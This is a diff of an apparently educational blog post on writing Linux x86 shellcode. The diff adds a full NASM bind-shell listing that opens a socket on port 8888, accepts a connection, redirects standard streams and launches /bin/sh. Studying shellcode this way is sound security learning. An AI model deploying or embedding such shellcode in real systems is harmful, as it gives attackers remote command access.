@@ -194,7 +194,71 @@ Also it is important to know how the system calls work in Linux. As stated in th
 <br>
 Knowing this and the values from the Libemu's output, it is possible to write the nasm code.<br>
 <br>
+<br><code style="background-color: #eee; border: 1px solid #999; display: block; padding: 20px; font-size: 110%; color: black; word-wrap: break-word;">global _start<br>
 <br>
+section .text<br>
+<br>
+_start:<br>
+<br>
+xor eax, eax<br>
+mov al, 0x4<br>
+xor ebx, ebx<br>
+mov bl, 1<br>
+push 0x0a2e2e2e<br>
+push 0x74726f70<br>
+push 0x20676e69<br>
+push 0x646e6942<br>
+mov ecx,esp<br>
+xor edx, edx<br>
+mov dl, 0x10<br>
+int 0x80<br>
+xor eax, eax<br>
+mov ax, 0x167<br>
+mov bl, 2<br>
+xor ecx, ecx<br>
+mov cl, 1<br>
+xor edx, edx<br>
+int 0x80<br>
+mov ebx, eax<br>
+xor eax, eax<br>
+mov ax, 0x169<br>
+xor edi, edi<br>
+mov edi, 0x12111190<br>
+sub edi, 0x11111111<br>
+push edi<br>
+push word 0xb822<br>
+push word 2<br>
+mov ecx, esp<br>
+mov dl, 0x66<br>
+int 0x80<br>
+mov ax, 0x16b<br>
+xor ecx, ecx<br>
+int 0x80<br>
+mov ax, 0x16c<br>
+xor edx, edx<br>
+xor esi, esi<br>
+int 0x80<br>
+mov ebx, eax<br>
+mov cl, 3<br>
+int 0x80<br>
+bucle:<br>
+xor eax, eax<br>
+mov al, 0x3f<br>
+int 0x80<br>
+dec ecx<br>
+jns bucle<br>
+xor eax, eax<br>
+push eax<br>
+push 0x68732f2f<br>
+push 0x6e69622f<br>
+mov ebx, esp<br>
+push eax<br>
+mov edx, esp<br>
+push ebx<br>
+mov ecx, esp<br>
+mov al, 11<br>
+int 0x80<br>
+</code><br>
 <h3> Creating the Python wrapper </h3>
 <br>
 Get the shellcode changing the "\\" to "\\\\":<br>
